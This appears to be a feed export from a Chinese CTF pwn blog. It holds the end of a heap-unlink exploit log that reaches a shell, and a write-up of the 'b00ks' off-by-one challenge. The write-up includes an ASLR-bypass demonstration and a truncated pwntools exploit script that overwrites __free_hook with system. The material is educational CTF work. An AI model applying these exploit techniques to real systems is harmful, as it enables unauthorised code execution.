class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">38</span> <span class="number">21</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">40</span> <span class="number">21</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |<span class="number">8</span>!`·|····|@!`·|····|</span><br><span class="line"><span class="number">00000020</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line">*</span><br><span class="line"><span class="number">00000080</span>  <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000090</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'32\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x20</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |····|····|····|····|</span><br><span class="line"><span class="number">00000010</span>  <span class="number">18</span> <span class="number">20</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |· `·|····|  `·|····|</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">60</span> <span class="number">07</span> <span class="number">40</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                            |`·@·|····||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">90</span> <span class="number">8</span>f ec <span class="number">5</span>e  <span class="number">72</span> <span class="number">7</span>f <span class="number">0</span>a <span class="number">4</span>f  <span class="number">4</span>b <span class="number">0</span>a                     |···^|r··O|K·|</span><br><span class="line"><span class="number">0000000</span>a</span><br><span class="line"><span class="number">0x7f725eec8f90</span></span><br><span class="line">[+] system addr: <span class="number">0x7f725ee9f480</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">80</span> f4 e9 <span class="number">5</span>e  <span class="number">72</span> <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>                            |···^|r···||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'8\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            |/bin|/sh·||</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">[DEBUG] Received <span class="number">0x3</span> bytes:</span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[*] [Exec sh...]</span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'whoami\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'asan\n'</span></span><br><span class="line">asan</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h1><span id="reference">Reference</span></h1><ul><li><a href="https://0x3f97.github.io/pwn/2018/01/17/hitconctf2014-stkof/" target="_blank" rel="external">https://0x3f97.github.io/pwn/2018/01/17/hitconctf2014-stkof/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/unlink/#_5" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/unlink/#_5</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pwntools:3.12.1&lt;/li&gt;
&lt;li&gt;wsl debian&lt;/li&gt;
&lt;li&gt;libc:2.24&lt;/li&gt;
&lt;li&gt;gdb+gef,IDA&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;checksec:&lt;br&gt;&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="heap" scheme="https://asanzjx.github.io/categories/heap/"/>
    
    
      <category term="CTF" scheme="https://asanzjx.github.io/tags/CTF/"/>
    
      <category term="heap" scheme="https://asanzjx.github.io/tags/heap/"/>
    
      <category term="exp" scheme="https://asanzjx.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>b00ks - null byte off-by-one 实战详解</title>
    <link href="https://asanzjx.github.io/2018/10/21/b00ks_detail/"/>
    <id>https://asanzjx.github.io/2018/10/21/b00ks_detail/</id>
    <published>2018-10-21T04:00:00.000Z</published>
    <updated>2018-10-21T05:20:52.541Z</updated>
    
    <content type="html"><![CDATA[<p>heap null byte off-by-one</p><p>分析环境：</p><ul><li>Linux parrot 4.17.0-parrot17-amd64 #1 SMP Parrot 4.17.17-1parrot17 (2018-08-27) x86_64 GNU/Linux</li><li>pwntools:3.12.1</li><li>gdb + gef, IDA</li><li>libc:2.27</li></ul><p>checksec:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$checksec ./b00ks</span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">Canary    No</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">Fortify   No</span><br></pre></td></tr></table></figure></p><p>保护全开，ret2plt,覆写 got table 就不要想了</p><h1><span id="定位漏洞点">定位漏洞点</span></h1><p>问题出在 book name read() 控制上，也就是 offset+0x9f5 这个函数上：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">_BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">buf = a1;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )&#123;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line"><span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">++buf;</span><br><span class="line"><span class="keyword">if</span> ( i == a2 )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">*buf = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>a2 是输入的 author name size - 1;a1 是 malloc(a2+1) 返回的指针.</p><p>从这段 for 循环中可以看出，实际可以 read() a2+1 次，那么 ‘\x00’ 自然也会被写入到内存中了。这是一种很典型的栅栏错误。</p><p>author name 位于 bss 段，其后是一个 book struct 指针表</p><p>通过 4 选项，可以知道 book detail:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> book&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">char</span> *description;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h1><span id="分析过程">分析过程</span></h1><p>在以下地方下断比较好分析：</p><ul><li>b *0x555555554af1，获取功能号前</li><li>b *0x123b,0x555555554240，选项前一行</li><li>b *0x9f5,0x0x55555555549f5，读取字符串函数</li></ul><p><strong>关键点</strong>：如果要堆分配的内存很大的话，那么会使用 mmap 来重新申请内存空间，并且这块区域邻近 bss 段。offset == mmap ret addr - libc base addr，那么就可以推算出 libc base addr。</p><p>关于这个点，我一直很疑惑，通过实际代码在不同的 Linux 发行版上测试，大部分情况下这个偏移是固定，但在 wsl debian 这个偏移就不固定了。</p><h1><span id="linux-mmap-aslr-失效漏洞">linux mmap ASLR 失效漏洞</span></h1><p>这里介绍一个 Linux mmap ASLR 失效的漏洞，CVE-2016-3672。</p><p>影响范围：Linux kernel &lt;= 4.5.2</p><p>验证方法：</p><ul><li>设置栈空间为不限制大小ulimit -s unlimited</li><li>使用ldd看动态库加载的地址是否发生变化</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">2.6.32-642.el6.i686</span><br><span class="line"></span><br><span class="line">$ cat /proc/sys/kernel/randomize_va_space </span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">$ ulimit -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 7864</span><br><span class="line">max locked memory       (kbytes, -l) 64</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 10240</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 7864</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x00b05000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x00296000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x009ba000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x00505000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ulimit -s unlimited</span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x40000000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x40015000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br><span class="line"></span><br><span class="line">$ ldd ./mmap_libc_base_addr32 </span><br><span class="line">linux-gate.so.1 =&gt;  (0x40000000)</span><br><span class="line">libc.so.6 =&gt; /lib/libc.so.6 (0x40015000)</span><br><span class="line">/lib/ld-linux.so.2 (0x00a51000)</span><br></pre></td></tr></table></figure><h1><span id="利用思路">利用思路</span></h1><ol><li><p>泄露 book1 结构体堆指针地址。具体步骤</p><ol><li>author name 输入 32 个字符</li><li>选择 1.create book1 </li><li><p>选择 4.print book1 struct,”Author: “ field 可泄露出 book1 结构体堆指针</p><p>为什么可以泄露 book1 结构体指针呢，这是因为32个字符连着地址，没有结束符 “\x00”</p></li></ol></li><li>计算得到要伪造的 fake book addr及偏移量</li><li>创建 book2 with 0x21000 的 book2 desc 和 “/bin/sh” 的 book2 name</li><li>构造 fake book1。编辑 book1 ，实际就是对 book1 desc 写入数据，，fake book1 name 存储着 *book2 desc addr</li><li>leak mmap 分配的内存地址。print fake book,泄露 book2 desc addr,由此推算出 libc base addr ，然后再计算出 system addr , /bin/sh , __free_hook 的地址</li><li>覆写 free hook。分两步，先修改 fake book desc 存储的指针为 free book 的地址；然后修改 book2 desc ，改写 __free_hook 存储的地址为 system 地址</li><li>执行 shell。delete book2, free book2 name 的时候执行的就是 system(book2 name)</li></ol><h1><span id="内存管理器-hook-机制">内存管理器 Hook 机制</span></h1><p>在 Linux 下，内存管理器一般通过 HOOK 来实现自定义的malloc函数，具体就是通过覆盖 hook 函数指针来实现。glibc 提供四个全局函数 hook 指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__malloc_hook</span><br><span class="line">__realloc_hook</span><br><span class="line">__free_hook</span><br><span class="line">__memalign_hook</span><br></pre></td></tr></table></figure><p>所以像 jemalloc 或者 tcmalloc 等堆管理器通过覆盖这些 hook 函数指针使程序调用到它们自定义的malloc。当然在漏洞利用的时候也常被用来覆写为 system() 等地址。</p><p>所以在这里，既然不可以覆写 got 表，那么就覆写 __free_hook 函数地址。</p><h1><span id="脚本及-getshell">脚本及 getshell</span></h1><p>以下脚本在 ASLR == 0 或 1 时可 getshell,在开启 ASLR == 2 时一定几率可 getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* encoding:utf-8 *-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(target, name_size, book_name, desc_size, book_desc)</span>:</span></span><br><span class="line">target.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">target.sendline(<span class="string">'1'</span>)</span><br><span class="line">target.sendlineafter(<span class="string">'Enter book name size: '</span>, str(name_size))</span><br><span class="line">target.sendlineafter(<span class="string">'Enter book name (Max 32 chars): '</span>, book_name)</span><br><span class="line">target.sendlineafter(<span class="string">'Enter book description size: '</span>, str(desc_size))</span><br><span class="line">target.sendlineafter(<span class="string">'Enter book description: '</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span><span class="params">(p)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_book1</span><span class="params">(target)</span>:</span></span><br><span class="line">target.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">target.sendline(<span class="string">"4"</span>)</span><br><span class="line">target.recvuntil(<span class="string">"Author: "</span>)</span><br><span class="line">author_msg = target.recvline()</span><br><span class="line">msg = author_msg.split(<span class="string">"A"</span> * <span class="number">32</span>)[<span class="number">1</span>]</span><br><span class="line">msg = msg.split(<span class="string">"\n"</span>)[<span class="number">0</span>]</span><br><span class="line">context.bits = len(msg) * <span class="number">8</span></span><br><span class="line">addr = unpack(msg)</span><br><span class="line">log.success(<span class="string">"Leaked address of book1 struct object : "</span> + hex(addr))</span><br><span class="line"><span class="comment"># context.bits = 64</span></span><br><span class="line"><span class="comment"># log.info(addr)</span></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(p,bookid,book_desc)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">p.sendline(str(bookid))</span><br><span class="line">p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">p.sendline(book_desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mmap</span><span class="params">(p)</span>:</span></span><br><span class="line">log.info(<span class="string">"[+] Leak mmap-libc offset"</span>)</span><br><span 